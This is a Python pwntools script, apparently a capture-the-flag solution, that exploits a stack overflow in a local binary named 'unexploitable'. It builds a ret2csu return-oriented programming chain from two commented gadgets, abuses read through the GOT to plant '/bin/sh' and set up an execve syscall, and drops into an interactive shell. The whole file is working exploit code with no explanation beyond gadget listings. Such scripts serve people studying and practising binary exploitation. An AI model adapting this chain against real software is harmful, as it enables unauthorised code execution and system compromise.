#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

elf = ELF("./unexploitable")
r = process('./unexploitable')
#gdb.attach(proc.pidof(r)[0])

'''
mov     rdx, r15
mov     rsi, r14
mov     edi, r13d
call    qword ptr [r12+rbx*8]
add     rbx, 1
cmp     rbx, rbp
jnz     short loc_4005D0
...
gadget2
'''
gadget1 = 0x4005D0

'''
mov     rbx, [rsp+0x8]
mov     rbp, [rsp+0x10]
mov     r12, [rsp+0x18]
mov     r13, [rsp+0x20]
mov     r14, [rsp+0x28]
mov     r15, [rsp+0x30]
add     rsp, 38h
ret
'''
gadget2 = 0x4005E6

buf = 0x601100
syscall = 0x400560

rop = flat(
    gadget2,
    0,
    0,                # rbx
    1,                # rbp
    elf.got['read'], # r12
    0,                # r13 -> edi
    buf,              # r14 -> rsi
    59,               # r15 -> rdx
    
    gadget1,
    0,
    0,         # rbx
    1,         # rbp
    buf + 0x8, # r12
    buf,       # r13 -> edi
    0,         # r14 -> rsi
    0,         # r15 -> rdx

    gadget1
)

r.send((b'A' * 0x18 + rop).ljust(0x050f, b'\x00'))
r.send((b'/bin/sh\x00' + flat(syscall)).ljust(59, b'\x00'))

r.interactive()
